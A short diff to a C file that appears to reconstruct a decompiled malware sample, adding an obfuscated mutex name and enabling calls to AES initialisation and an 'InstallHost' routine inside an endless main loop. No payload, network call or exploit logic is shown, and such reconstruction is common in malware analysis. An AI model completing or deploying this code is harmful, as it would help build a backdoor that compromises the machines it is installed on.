@@ -8,7 +8,8 @@
 #include <sys/time.h>
 
 // .data segment
-AuthenticatedSocket = -1; // prob set to -1
+uint32_t AuthenticatedSocket = -1; // prob set to -1
+char *MutexName = "n|,Év-";
 
 // .bss segment
 char *DecryptionContext;
@@ -31,13 +32,13 @@ int main (int argc, char **argv, char **envp) {
 	// Value used to ease decompilation
 	int ret;
 
-	// InitAESTables();
+	InitAESTables();
 
 	// InitTransfersList();
 
 	// ReadSettings();
 
-	// InstallHost();
+	InstallHost();
 
 	while (1) {
 
